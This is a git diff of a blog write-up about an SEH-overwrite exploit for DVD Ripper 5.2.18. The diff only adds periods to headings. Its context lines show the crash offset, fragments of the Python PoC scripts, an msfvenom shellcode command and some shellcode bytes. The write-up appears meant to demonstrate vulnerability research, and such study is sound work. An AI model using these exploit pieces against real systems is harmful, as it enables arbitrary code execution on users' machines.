@@ -7,7 +7,7 @@ comments: false
 en: true
 ---
 
-# The Bug 
+# The Bug.
 
 ### DVD Ripper version 5.2.18 suffers from a Structured Exception Handling Overwrite when a long string is parsed through the parameter "License Name" within the registration in the bootup.
 
@@ -23,11 +23,11 @@ f.write(buffer)
 f.close()
 ```
 
-### The exploit is generated
+### The exploit is generated.
 
 ![](/assets/img/Findings10/1.png)
 
-### The exploit is copied into the clipboard
+### The exploit is copied into the clipboard.
 
 ![](/assets/img/Findings10/2.png)
 
@@ -35,15 +35,15 @@ f.close()
 
 ![](/assets/img/Findings10/3.png)
 
-## Crash I
+## Crash I.
 
 ![](/assets/img/Findings10/4.png)
 
-# Controlling the execution
+# Controlling the execution.
 
 ### Through the use of msf-pattern*, the offset is found to be at 6008.
 
-### PoC
+### PoC.
 
 ```term
 import struct
@@ -55,11 +55,11 @@ f.write(buffer)
 f.close()
 ```
 
-### Crash II
+### Crash II.
 
 ![](/assets/img/Findings10/5.png)
 
-### List of the available modules
+### List of the available modules.
 
 ![](/assets/img/Findings10/6.png)
 
@@ -67,7 +67,7 @@ f.close()
 
 ![](/assets/img/Findings10/7.png)
 
-### PoC
+### PoC.
 
 ```term
 import struct
@@ -82,13 +82,13 @@ f.write(buffer)
 f.close()
 ```
 
-### Crash III
+### Crash III.
 
 ![](/assets/img/Findings10/8.png)
 
 ### The jump is seen to fall not within the \xff characters, in order to fix this, the jump is changed on its last byte to be a bit higher, instead of being 06 to 08.
 
-### PoC
+### PoC.
 
 ```term
 import struct
@@ -103,11 +103,11 @@ f.write(buffer)
 f.close()
 ```
 
-### Crash IV
+### Crash IV.
 
 ![](/assets/img/Findings10/9.png)
 
-## Generating Shellcode
+## Generating Shellcode.
 
 ```term
 root@whitecr0wz:~# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
@@ -157,7 +157,7 @@ buf += b"\x61\x71\x30\x6c\x62\x43\x64\x6e\x50\x65\x50\x78\x70"
 buf += b"\x65\x75\x50\x41\x41"
 ```
 
-### Final PoC
+### Final PoC.
 
 ```term
 import struct
@@ -212,6 +212,6 @@ f.write(buffer)
 f.close()
 ```
 
-# EndGame
+# EndGame.
 
 ![](/assets/img/Findings10/10.gif)
